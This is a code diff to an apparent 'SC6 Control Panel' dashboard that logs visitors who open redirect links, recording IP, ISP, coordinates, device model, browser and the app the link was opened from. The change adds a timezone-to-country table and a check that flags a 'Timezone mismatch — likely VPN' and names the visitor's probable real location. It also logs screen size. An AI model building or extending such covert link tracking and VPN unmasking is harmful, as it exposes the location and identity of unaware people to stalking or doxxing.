@@ -170,7 +170,7 @@ ul.devlist li:last-child{border-bottom:none}
   <div style="display:flex;flex-direction:column;align-items:center;gap:4px;margin-bottom:28px">
     <div style="font-size:1.35rem;font-weight:800;letter-spacing:.12em;color:#fff">SC6</div>
     <div style="font-size:.58rem;font-weight:600;letter-spacing:.2em;color:rgba(255,255,255,.22);text-transform:uppercase">Control Panel</div>
-    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.9.25</div>
+    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.9.26</div>
   </div>
   <div class="home-btns">
     <button class="home-btn" id="btnDev">
@@ -2028,12 +2028,13 @@ function loadOpRedirectList(){
               'Gmail':'📧','Outlook':'📧','Signal':'🔒','Spotify':'🎧','Twitch':'🟣'
             };
             var srcIcon=sourceIcon[src]||'🔗';
+            var tzCheck=checkTzMismatch(tz,h.country||'?');
+            var screen=h.screen&&h.screen!=='?'?h.screen:'';
             var did='trhit-'+id+'-'+hi;
             return '<li style="padding:7px 0;border-bottom:1px solid rgba(255,255,255,.07)">'
               +'<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:4px">'
-              // VPN badge — always visible
               +(vpn?'<span style="font-size:.6rem;background:rgba(255,80,80,.2);color:#ff5050;border:1px solid #ff5050;border-radius:3px;padding:1px 5px">⚠ VPN / PROXY</span>':'<span style="font-size:.6rem;background:rgba(80,255,160,.12);color:#4fc;border:1px solid rgba(80,255,160,.3);border-radius:3px;padding:1px 5px">✓ Clean</span>')
-              // Location always visible
+              +(tzCheck.mismatch?'<span style="font-size:.6rem;background:rgba(255,165,0,.18);color:#ffaa33;border:1px solid rgba(255,165,0,.4);border-radius:3px;padding:1px 5px">🌐 TZ mismatch</span>':'')
               +'<span style="font-size:.72rem;color:#4fc;font-weight:600">📍 '+esc(loc)+'</span>'
               +(dwellStr?'<span style="font-size:.65rem;color:#a0cfff">⏱ '+esc(dwellStr)+'</span>':'')
               +'<span style="margin-left:auto;font-size:.6rem;color:#555">'+esc(new Date(h.time).toLocaleString())+'</span>'
@@ -2043,9 +2044,11 @@ function loadOpRedirectList(){
               +(h.ip&&h.ip!=='?'?'<div>🌐 <span style="color:#f5c800;font-family:monospace;font-weight:600">'+esc(h.ip)+'</span></div>':'')
               +(isp?'<div>📡 <span style="color:#aaa">ISP:</span> <span style="color:#ccc">'+esc(isp)+'</span></div>':'')
               +(vpn?'<div style="color:#ff5050">⚠ VPN / Proxy / Hosting IP flagged</div>':'')
+              +(tzCheck.mismatch?'<div style="color:#ffaa33;background:rgba(255,165,0,.08);border:1px solid rgba(255,165,0,.25);border-radius:4px;padding:4px 7px;margin-top:3px">🌐 <span style="font-weight:600">Timezone mismatch — likely VPN</span><br><span style="color:#ccc">IP says <b>'+esc(h.country||'?')+'</b> but timezone is <b>'+esc(tz)+'</b> — actual location may be <b>'+esc(tzCheck.tzCountryName)+'</b></span></div>':'')
               +'<div style="margin-top:3px;padding-top:3px;border-top:1px solid rgba(255,255,255,.06)">'
               +(h.model&&h.model!=='?'?'<div>📱 <span style="color:#fff;font-weight:600">'+esc(h.model)+'</span></div>':'')
               +'<div>'+esc(h.device||'?')+' · '+esc(h.os||'?')+' · '+esc(h.browser||'?')+'</div>'
+              +(screen?'<div>🖥 <span style="color:#aaa">Screen:</span> <span style="color:#ccc">'+esc(screen)+'</span></div>':'')
               +'</div>'
               +'<div style="margin-top:3px;padding-top:3px;border-top:1px solid rgba(255,255,255,.06)">'
               +(coordStr?'<div>🗺 <span style="color:#888">Coords:</span> <span style="color:#ccc">'+esc(h.lat)+', '+esc(h.lon)+'</span></div>':'')
@@ -3054,10 +3057,13 @@ function loadDevRedirectList(){
             var openedFrom=src?src:(h.referer&&h.referer!=='?'?h.referer.slice(0,60):'Direct / unknown');
             var sourceIcon={'Instagram':'📸','Twitter/X':'🐦','Facebook':'👥','WhatsApp':'💬','Telegram':'✈️','Discord':'🎮','Reddit':'🔴','TikTok':'🎵','YouTube':'▶️','Snapchat':'👻','LinkedIn':'💼','Google':'🔍','Gmail':'📧','Outlook':'📧','Signal':'🔒','Spotify':'🎧','Twitch':'🟣'};
             var srcIcon=sourceIcon[src]||'🔗';
+            var tzCheck=checkTzMismatch(tz,h.country||'?');
+            var screen=h.screen&&h.screen!=='?'?h.screen:'';
             var did='devrhit-'+id+'-'+hi;
             return '<li style="padding:7px 0;border-bottom:1px solid rgba(255,255,255,.07)">'
               +'<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:4px">'
               +(vpn?'<span style="font-size:.6rem;background:rgba(255,80,80,.2);color:#ff5050;border:1px solid #ff5050;border-radius:3px;padding:1px 5px">⚠ VPN / PROXY</span>':'<span style="font-size:.6rem;background:rgba(80,255,160,.12);color:#4fc;border:1px solid rgba(80,255,160,.3);border-radius:3px;padding:1px 5px">✓ Clean</span>')
+              +(tzCheck.mismatch?'<span style="font-size:.6rem;background:rgba(255,165,0,.18);color:#ffaa33;border:1px solid rgba(255,165,0,.4);border-radius:3px;padding:1px 5px">🌐 TZ mismatch</span>':'')
               +'<span style="font-size:.72rem;color:#4fc;font-weight:600">📍 '+esc(loc)+'</span>'
               +(dwellStr?'<span style="font-size:.65rem;color:#a0cfff">⏱ '+esc(dwellStr)+'</span>':'')
               +'<span style="margin-left:auto;font-size:.6rem;color:#555">'+esc(new Date(h.time).toLocaleString())+'</span>'
@@ -3067,9 +3073,11 @@ function loadDevRedirectList(){
               +(h.ip&&h.ip!=='?'?'<div>🌐 <span style="color:#f5c800;font-family:monospace;font-weight:600">'+esc(h.ip)+'</span></div>':'')
               +(isp?'<div>📡 <span style="color:#aaa">ISP:</span> <span style="color:#ccc">'+esc(isp)+'</span></div>':'')
               +(vpn?'<div style="color:#ff5050">⚠ VPN / Proxy / Hosting IP flagged</div>':'')
+              +(tzCheck.mismatch?'<div style="color:#ffaa33;background:rgba(255,165,0,.08);border:1px solid rgba(255,165,0,.25);border-radius:4px;padding:4px 7px;margin-top:3px">🌐 <span style="font-weight:600">Timezone mismatch — likely VPN</span><br><span style="color:#ccc">IP says <b>'+esc(h.country||'?')+'</b> but timezone is <b>'+esc(tz)+'</b> — actual location may be <b>'+esc(tzCheck.tzCountryName)+'</b></span></div>':'')
               +'<div style="margin-top:3px;padding-top:3px;border-top:1px solid rgba(255,255,255,.06)">'
               +(h.model&&h.model!=='?'?'<div>📱 <span style="color:#fff;font-weight:600">'+esc(h.model)+'</span></div>':'')
               +'<div>'+esc(dev)+'</div>'
+              +(screen?'<div>🖥 <span style="color:#aaa">Screen:</span> <span style="color:#ccc">'+esc(screen)+'</span></div>':'')
               +'</div>'
               +'<div style="margin-top:3px;padding-top:3px;border-top:1px solid rgba(255,255,255,.06)">'
               +(coordStr?'<div>🗺 <span style="color:#888">Coords:</span> <span style="color:#ccc">'+esc(h.lat)+', '+esc(h.lon)+'</span></div>':'')
@@ -3351,6 +3359,67 @@ function sanitizeAlias(s){
 // GEOFENCING
 // ══════════════════════════════════════════
 function geoUrl(){return fbUrl('_sc6/geofence')}
+
+// Timezone → expected country code(s)
+var TZ_COUNTRY={
+  'Africa/Abidjan':'CI','Africa/Accra':'GH','Africa/Addis_Ababa':'ET','Africa/Algiers':'DZ',
+  'Africa/Cairo':'EG','Africa/Casablanca':'MA','Africa/Dar_es_Salaam':'TZ','Africa/Djibouti':'DJ',
+  'Africa/Douala':'CM','Africa/Johannesburg':'ZA','Africa/Kampala':'UG','Africa/Khartoum':'SD',
+  'Africa/Kigali':'RW','Africa/Lagos':'NG','Africa/Luanda':'AO','Africa/Lusaka':'ZM',
+  'Africa/Maputo':'MZ','Africa/Nairobi':'KE','Africa/Tripoli':'LY','Africa/Tunis':'TN',
+  'Africa/Windhoek':'NA','America/Anchorage':'US','America/Argentina/Buenos_Aires':'AR',
+  'America/Asuncion':'PY','America/Bogota':'CO','America/Caracas':'VE','America/Chicago':'US',
+  'America/Costa_Rica':'CR','America/Denver':'US','America/El_Salvador':'SV',
+  'America/Guatemala':'GT','America/Guayaquil':'EC','America/Halifax':'CA',
+  'America/Havana':'CU','America/Honduras':'HN','America/Jamaica':'JM',
+  'America/Lima':'PE','America/Los_Angeles':'US','America/Managua':'NI',
+  'America/Mexico_City':'MX','America/Monterrey':'MX','America/Montevideo':'UY',
+  'America/New_York':'US','America/Panama':'PA','America/Phoenix':'US',
+  'America/Puerto_Rico':'US','America/Santiago':'CL','America/Santo_Domingo':'DO',
+  'America/Sao_Paulo':'BR','America/Tegucigalpa':'HN','America/Toronto':'CA',
+  'America/Vancouver':'CA','America/Winnipeg':'CA','Asia/Almaty':'KZ',
+  'Asia/Amman':'JO','Asia/Baghdad':'IQ','Asia/Bahrain':'BH','Asia/Baku':'AZ',
+  'Asia/Bangkok':'TH','Asia/Beirut':'LB','Asia/Bishkek':'KG','Asia/Colombo':'LK',
+  'Asia/Damascus':'SY','Asia/Dhaka':'BD','Asia/Dubai':'AE','Asia/Gaza':'PS',
+  'Asia/Ho_Chi_Minh':'VN','Asia/Hong_Kong':'HK','Asia/Jakarta':'ID',
+  'Asia/Jerusalem':'IL','Asia/Kabul':'AF','Asia/Karachi':'PK','Asia/Kathmandu':'NP',
+  'Asia/Kolkata':'IN','Asia/Kuala_Lumpur':'MY','Asia/Kuwait':'KW','Asia/Makassar':'ID',
+  'Asia/Manila':'PH','Asia/Muscat':'OM','Asia/Nicosia':'CY','Asia/Novosibirsk':'RU',
+  'Asia/Phnom_Penh':'KH','Asia/Qatar':'QA','Asia/Rangoon':'MM','Asia/Riyadh':'SA',
+  'Asia/Seoul':'KR','Asia/Shanghai':'CN','Asia/Singapore':'SG','Asia/Taipei':'TW',
+  'Asia/Tashkent':'UZ','Asia/Tbilisi':'GE','Asia/Tehran':'IR','Asia/Tokyo':'JP',
+  'Asia/Ulaanbaatar':'MN','Asia/Vientiane':'LA','Asia/Vladivostok':'RU',
+  'Asia/Yangon':'MM','Asia/Yekaterinburg':'RU','Asia/Yerevan':'AM',
+  'Atlantic/Reykjavik':'IS','Australia/Adelaide':'AU','Australia/Brisbane':'AU',
+  'Australia/Darwin':'AU','Australia/Hobart':'AU','Australia/Melbourne':'AU',
+  'Australia/Perth':'AU','Australia/Sydney':'AU',
+  'Europe/Amsterdam':'NL','Europe/Athens':'GR','Europe/Belgrade':'RS',
+  'Europe/Berlin':'DE','Europe/Bratislava':'SK','Europe/Brussels':'BE',
+  'Europe/Bucharest':'RO','Europe/Budapest':'HU','Europe/Chisinau':'MD',
+  'Europe/Copenhagen':'DK','Europe/Dublin':'IE','Europe/Helsinki':'FI',
+  'Europe/Istanbul':'TR','Europe/Kiev':'UA','Europe/Kyiv':'UA',
+  'Europe/Lisbon':'PT','Europe/Ljubljana':'SI','Europe/London':'GB',
+  'Europe/Luxembourg':'LU','Europe/Madrid':'ES','Europe/Minsk':'BY',
+  'Europe/Monaco':'MC','Europe/Moscow':'RU','Europe/Nicosia':'CY',
+  'Europe/Oslo':'NO','Europe/Paris':'FR','Europe/Prague':'CZ',
+  'Europe/Riga':'LV','Europe/Rome':'IT','Europe/Sarajevo':'BA',
+  'Europe/Skopje':'MK','Europe/Sofia':'BG','Europe/Stockholm':'SE',
+  'Europe/Tallinn':'EE','Europe/Tirane':'AL','Europe/Vienna':'AT',
+  'Europe/Vilnius':'LT','Europe/Warsaw':'PL','Europe/Zagreb':'HR',
+  'Europe/Zurich':'CH','Indian/Maldives':'MV','Indian/Mauritius':'MU',
+  'Pacific/Auckland':'NZ','Pacific/Fiji':'FJ','Pacific/Guam':'GU',
+  'Pacific/Honolulu':'US','Pacific/Port_Moresby':'PG','Pacific/Tongatapu':'TO'
+};
+
+// Returns {mismatch:true, tzCountry:'TR', tzCountryName:'Turkey'} or {mismatch:false}
+function checkTzMismatch(tz, country){
+  if(!tz||tz==='?'||!country||country==='?') return {mismatch:false};
+  var expected=TZ_COUNTRY[tz];
+  if(!expected) return {mismatch:false};
+  if(expected===country) return {mismatch:false};
+  var name=GEO_COUNTRIES.find(function(c){return c[0]===expected;});
+  return {mismatch:true,tzCountry:expected,tzCountryName:name?name[1]:expected};
+}
 
 // Full country list: [code, name]
 var GEO_COUNTRIES=[
